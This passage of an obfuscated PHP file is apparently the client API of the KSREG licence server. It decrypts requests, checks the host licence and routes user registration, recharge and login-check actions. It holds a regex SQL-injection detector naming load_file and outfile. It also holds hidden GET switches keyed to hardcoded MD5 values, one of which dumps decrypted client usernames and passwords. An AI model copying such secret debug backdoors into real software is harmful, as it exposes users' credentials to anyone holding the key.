	exit("Thank you for using KSREG,    please support the Genuine software! CLS");
}

require ("io_ext.php");
require ("../kss_inc/inc.php");
require ("../kss_inc/rsa.php");
hy_638410abb5a4c93078();
require (Client_Language . ".php");
set_error_handler("error_report_fun_api");
$HY_43e4557f250c621a39 = hy_ba8120f86a7df1aecc("c", "pg", "int", 1);
$HY_2ca00ce8d2082dc88b = hy_ba8120f86a7df1aecc("apiver", "pg", "int", 900);
$HY_d762a272713d62924f = hy_ba8120f86a7df1aecc("a", "pg", "sql", "");
$HY_4c1a8cf463625865a9 = $_SERVER["HTTP_HOST"];
$HY_cb896d9be5d2d056d4 = strpos($HY_4c1a8cf463625865a9, ":");

if ($HY_cb896d9be5d2d056d4 !== false) {
	$HY_4c1a8cf463625865a9 = substr($HY_4c1a8cf463625865a9, 0, $HY_cb896d9be5d2d056d4);
}

if (isset($_GET["testsync"]) && (md5($_GET["testsync"]) == MYSQLBAKPASSWORD)) {
	$HY_82d6536edf704aabc5 = new mysql_cls();
	$HY_82d6536edf704aabc5->HY_8adfa6fa6f18be3e6f($HY_e83242934e1fdef61f);
	echo "同步测试已启动，请到系统任务日志查看";
	hy_2aba1394ebfd0980ac();
	exit();
}

switch ($HY_2ca00ce8d2082dc88b) {
case 905:
	define("CLIENTVER", 905);

	if (stristr(WEBLIC . ",", "," . $HY_4c1a8cf463625865a9 . ",") === false) {
		if ($HY_43e4557f250c621a39 == 1) {
			exit("crypteno888");
		}

		exit("Thank you for using KSREG, please support the Genuine software![" . $HY_4c1a8cf463625865a9 . "]");
	}

	include ("../kss_inc/signdata/crypt95.php");
	break;

default:
	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno531");
	}

	exit("kssdata" . QQ236);
	break;
}

if (mt_rand(1, 10) == 5) {
	hy_eb430b8c32f4118ef7("api.php", $HY_43e4557f250c621a39);
}

if ($HY_d762a272713d62924f == "uplog") {
	include (dirname(__FILE__) . DIRECTORY_SEPARATOR . "io" . DIRECTORY_SEPARATOR . "soft.php");
	exit();
}

$HY_f47b2b08a81187ece1 = 0;
$HY_6c370550d94caffe93 = hy_ba8120f86a7df1aecc("s", "pg", "", "");
$HY_9b5ca9f68e24e9773d = $HY_6c370550d94caffe93;

if (function_exists("extfun_decode")) {
	$HY_6c370550d94caffe93 = extfun_decode($HY_6c370550d94caffe93);
}

$HY_4433a8f60c3d29fc2c = 0;
//通讯密钥解密过程
$HY_6c370550d94caffe93 = hy_238d2f1276c8b214f3($HY_6c370550d94caffe93, $HY_4433a8f60c3d29fc2c, Client_Language);
//接收数据经过通讯密钥解密后格式 必须以 crypt开头
if ("crypt" != substr($HY_6c370550d94caffe93, 0, 5)) {
	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno118");
	}

	exit("kssdata服务器无法正常解密数据");
}
//解密后解析数据内容 "crypt " 表示 RSA加密数据
if (substr($HY_6c370550d94caffe93, 0, 6) == "crypt ") {
	$HY_16643681f9dfea8ddc = KSSINCDIR . "advapi" . DIRECTORY_SEPARATOR . "rsa" . substr($HY_6c370550d94caffe93, 9, 7) . ".php";

	if (is_file($HY_16643681f9dfea8ddc)) {//9.5+以上 加载RSA密钥
		include ($HY_16643681f9dfea8ddc);

		if (SOFTRSAMODE == 0) {//全局RSA模式
			if ((strlen(RSA_PRVKEY) < 70) || (strlen(RSA_MODULES) < 70) || (RSACRYPT == 0)) {
				exit("crypteno151");
			}

			$HY_0a84bce3f60fed401b = stripos($HY_6c370550d94caffe93, "`");
			$HY_ad4607249871889078 = rsa_decrypt(substr($HY_6c370550d94caffe93, 17, $HY_0a84bce3f60fed401b - 17), RSA_PRVKEY, RSA_MODULES, 256);
			$HY_6c370550d94caffe93 = str_replace(" ", "", substr($HY_6c370550d94caffe93, 0, 17)) . $HY_ad4607249871889078 . substr($HY_6c370550d94caffe93, $HY_0a84bce3f60fed401b + 1);
		}
		else {
			if ((strlen(SOFTRSAEKEY) < 70) || (strlen(SOFTRSANKEY) < 70) || (SOFTRSAMODE == 2)) {
				exit("crypteno151");
			}

			$HY_0a84bce3f60fed401b = stripos($HY_6c370550d94caffe93, "`");
			$HY_ad4607249871889078 = rsa_decrypt(substr($HY_6c370550d94caffe93, 17, $HY_0a84bce3f60fed401b - 17), SOFTRSAEKEY, SOFTRSANKEY, 256);
			$HY_6c370550d94caffe93 = str_replace(" ", "", substr($HY_6c370550d94caffe93, 0, 17)) . $HY_ad4607249871889078 . substr($HY_6c370550d94caffe93, $HY_0a84bce3f60fed401b + 1);
		}
	}
	else {
		exit("crypteno171");
	}
}
//SQL注入检测
if (defined("SQLSAFECHK") && preg_match("/select|insert|update|delete |union|into|load_file|outfile|\.\/|\/\*|\%[0-9a-f]{2}|--|char\(|0x[0-9a-f]{6}|'/i", $HY_6c370550d94caffe93)) {
	$HY_e6b77c37c3104b66e7 = "?";
	$HY_975f0ca9eb0aaa39ee = "<" . $HY_e6b77c37c3104b66e7 . "php exit('Access denied to view this page!');" . $HY_e6b77c37c3104b66e7 . ">\r\n";
	if (!is_file("sqlhklog.php") || (102400 < filesize("sqlhklog.php"))) {
		file_put_contents("sqlhklog.php", $HY_975f0ca9eb0aaa39ee . date("ymdHis") . "\t" . hy_095bbb306fa343426f() . "\t" . $HY_6c370550d94caffe93 . "\r\n\r\n");
	}
	else {
		file_put_contents("sqlhklog.php", date("ymdHis") . "\t" . hy_095bbb306fa343426f() . "\t" . $HY_6c370550d94caffe93 . "\r\n\r\n", FILE_APPEND);
	}

	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno157");
	}

	exit("kssdata" . QQ235);
}
//完全明文 解析 :|:
$HY_d74cbaa6ba201b5462 = explode(":|:", $HY_6c370550d94caffe93);
//get提交数据 view=1982 表示可以直接打印 post提交的明文
if (isset($_GET["view"]) && (md5($_GET["view"]) == "fb87582825f9d28a8d42c5e5e5e8b23d")) {
	print_r($HY_d74cbaa6ba201b5462);
}

$HY_477da6babb1d47bd3d = "io";
$HY_8d722fd65930268e53 = $HY_d74cbaa6ba201b5462[2];
$HY_a3af5d94520f81d44f = $HY_d74cbaa6ba201b5462[3];
$HY_6993af4b451676aba9 = $HY_d74cbaa6ba201b5462[4];
$HY_6c9563bc30cc4d3152 = explode(",", $HY_6993af4b451676aba9);
$HY_cfaf262aef3e4af400 = time();

if (stripos(WEBLIC, "v9.hphu.com") == false) {
	if (stripos(WEBLIC, "vip.gutou.cc") !== false) {
		if (1000200 < $HY_a3af5d94520f81d44f) {
			if ($HY_43e4557f250c621a39 == 1) {
				exit("crypteno103");
			}

			exit("kssdata" . QQ102 . strlen($HY_a3af5d94520f81d44f));
		}
	}
	else if (1000100 < $HY_a3af5d94520f81d44f) {
		if ($HY_43e4557f250c621a39 == 1) {
			exit("crypteno103");
		}

		exit("kssdata" . QQ102 . strlen($HY_a3af5d94520f81d44f));
	}
}

if ($HY_43e4557f250c621a39 == 1) {
	if (!hy_d6173c9bc272354dd2($HY_a3af5d94520f81d44f) || (strlen($HY_a3af5d94520f81d44f) != 7)) {
		if (hy_d6173c9bc272354dd2($HY_a3af5d94520f81d44f) !== true) {
			exit("crypteno330");
		}

		exit("crypteno103");
	}

	if (stripos($HY_6993af4b451676aba9, "'") !== false) {
		exit("crypteno110");
	}
}
else {
	$HY_8f0748f1c3793c1369 = hy_d6173c9bc272354dd2($HY_a3af5d94520f81d44f);
	if (!hy_d6173c9bc272354dd2($HY_a3af5d94520f81d44f) || (strlen($HY_a3af5d94520f81d44f) != 7)) {
		if (hy_d6173c9bc272354dd2($HY_a3af5d94520f81d44f) !== true) {
			exit("kssdata" . QQ330 . strlen($HY_a3af5d94520f81d44f));
		}

		exit("kssdata" . QQ102 . strlen($HY_a3af5d94520f81d44f));
	}

	if (stripos($HY_6993af4b451676aba9, "'") !== false) {
		exit("kssdata" . QQ103);
	}
}

$HY_53f41d85d28b2dcdfe = dirname(__FILE__) . DIRECTORY_SEPARATOR . $HY_477da6babb1d47bd3d . DIRECTORY_SEPARATOR;
$HY_4d04a14ff98463e87e = $HY_53f41d85d28b2dcdfe . $HY_8d722fd65930268e53 . ".php";
$HY_82d6536edf704aabc5 = new mysql_cls();
$HY_82d6536edf704aabc5->HY_8adfa6fa6f18be3e6f($HY_e83242934e1fdef61f);
$HY_810d15d31408c982b2 = $HY_82d6536edf704aabc5->HY_409ede9e08e04ca87b("select * from kss_tb_soft where `softcode`=" . $HY_a3af5d94520f81d44f);

if (empty($HY_810d15d31408c982b2)) {
	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno101");
	}

	exit("kssdata" . QQ104);
}

hy_fb574e70b177459021($HY_810d15d31408c982b2["mac_blacklist"], long2ip($HY_063c1f55878eb36837), $HY_6993af4b451676aba9);
if (($HY_810d15d31408c982b2["softstatus"] == 1) && ($HY_8d722fd65930268e53 != "unline")) {
	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno107");
	}

	exit("kssdata" . QQ105);
}

$HY_12dbc503d0c6c33ec7 = $HY_810d15d31408c982b2["pid"] . "_" . $HY_810d15d31408c982b2["id"];
$HY_5581876e03ef6b60f7 = $HY_82d6536edf704aabc5->HY_409ede9e08e04ca87b("select * from kss_tb_manager where `pid`=" . $HY_810d15d31408c982b2["pid"] . " and `level`>7");

if (empty($HY_5581876e03ef6b60f7)) {
	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno104");
	}

	exit("kssdata" . QQ106);
}

if (($HY_5581876e03ef6b60f7["endtime"] < hy_cf2f0673819dddd4a1()) && ($HY_8d722fd65930268e53 != "unline")) {
	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno105");
	}

	exit("kssdata" . QQ107 . $HY_5581876e03ef6b60f7["endtime"]);
}

if (($HY_5581876e03ef6b60f7["islock"] == 1) && ($HY_8d722fd65930268e53 != "unline")) {
	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno106");
	}

	exit("kssdata" . QQ108);
}

hy_2aba1394ebfd0980ac();

switch ($HY_8d722fd65930268e53) {
case "unline":
	$HY_500e14df6c9dae523a = array("username" => $HY_d74cbaa6ba201b5462[5], "password" => $HY_d74cbaa6ba201b5462[6], "clientid" => $HY_d74cbaa6ba201b5462[7], "linecode" => $HY_d74cbaa6ba201b5462[8], "isrun" => $HY_d74cbaa6ba201b5462[9]);
	include ($HY_4d04a14ff98463e87e);
	break;

case "basechk":
	$HY_500e14df6c9dae523a = array("username" => $HY_d74cbaa6ba201b5462[12], "password" => $HY_d74cbaa6ba201b5462[11], "clientid" => $HY_d74cbaa6ba201b5462[10], "chked" => $HY_d74cbaa6ba201b5462[9], "linecode" => $HY_d74cbaa6ba201b5462[8], "ischangesvr" => $HY_d74cbaa6ba201b5462[7], "softver" => $HY_d74cbaa6ba201b5462[6], "isrun" => $HY_d74cbaa6ba201b5462[5], "bdinfo" => $HY_d74cbaa6ba201b5462[13], "valhost" => $HY_d74cbaa6ba201b5462[14]);
	$HY_a07f965085efe04893 = substr($HY_500e14df6c9dae523a["valhost"], 0, 2);
	$HY_41234dca52970f666b = $HY_a07f965085efe04893 % 3;

	if ($HY_41234dca52970f666b == 2) {
		//exit("crypteno161");
	}

	include ($HY_4d04a14ff98463e87e);
	break;

case "advapi":
	$HY_500e14df6c9dae523a = array("czkey" => $HY_d74cbaa6ba201b5462[5], "username" => $HY_d74cbaa6ba201b5462[7], "password" => $HY_d74cbaa6ba201b5462[6], "clientid" => $HY_d74cbaa6ba201b5462[8], "linecode" => $HY_d74cbaa6ba201b5462[9], "ischangesvr" => $HY_d74cbaa6ba201b5462[10], "cmd" => $HY_d74cbaa6ba201b5462[11]);
	include ($HY_4d04a14ff98463e87e);
	break;

case "reguser":
	$HY_500e14df6c9dae523a = array("username" => $HY_d74cbaa6ba201b5462[5], "password" => $HY_d74cbaa6ba201b5462[6], "password2" => $HY_d74cbaa6ba201b5462[7], "bdinfo" => $HY_d74cbaa6ba201b5462[8], "puser" => $HY_d74cbaa6ba201b5462[9], "czkey" => $HY_d74cbaa6ba201b5462[10]);
	if ((strlen($HY_500e14df6c9dae523a["username"]) < 3) || (32 < strlen($HY_500e14df6c9dae523a["username"]))) {
		exit("kssdata" . QQ109);
	}

	if (strlen($HY_500e14df6c9dae523a["password"]) < 5) {
		exit("kssdata" . QQ110);
	}

	if (strlen($HY_500e14df6c9dae523a["password2"]) < 5) {
		exit("kssdata" . QQ111);
	}

	if (100 < strlen($HY_500e14df6c9dae523a["bdinfo"])) {
		exit("kssdata" . QQ112);
	}

	include ($HY_4d04a14ff98463e87e);
	break;

case "czuser":
	$HY_500e14df6c9dae523a = array("username" => $HY_d74cbaa6ba201b5462[5], "czkey" => $HY_d74cbaa6ba201b5462[6]);

	if (strlen($HY_500e14df6c9dae523a["username"]) < 3) {
		exit("kssdata" . QQ113);
	}

	if (strlen($HY_500e14df6c9dae523a["czkey"]) < 32) {
		exit("kssdata" . QQ114);
	}

	include ($HY_4d04a14ff98463e87e);
	break;

case "edituser":
	$HY_500e14df6c9dae523a = array("username" => $HY_d74cbaa6ba201b5462[5], "password" => $HY_d74cbaa6ba201b5462[6], "password2" => $HY_d74cbaa6ba201b5462[7], "bdinfo" => $HY_d74cbaa6ba201b5462[8]);

	if (strlen($HY_500e14df6c9dae523a["username"]) < 3) {
		exit("kssdata" . QQ113);
	}

	include ($HY_4d04a14ff98463e87e);
	break;

case "unbind":
	$HY_500e14df6c9dae523a = array("username" => $HY_d74cbaa6ba201b5462[5], "password" => $HY_d74cbaa6ba201b5462[6], "clientid" => $HY_d74cbaa6ba201b5462[7], "isrun" => $HY_d74cbaa6ba201b5462[8]);
	include ($HY_4d04a14ff98463e87e);
	break;

case "view_uk":
	$HY_500e14df6c9dae523a = array("username" => $HY_d74cbaa6ba201b5462[5]);
	include ($HY_4d04a14ff98463e87e);
	break;

default:
	ob_clean();

	if ($HY_43e4557f250c621a39 == 1) {
		exit("crypteno119");
	}

	exit("kssdata" . QQ115);
	break;
}

exit();

?>
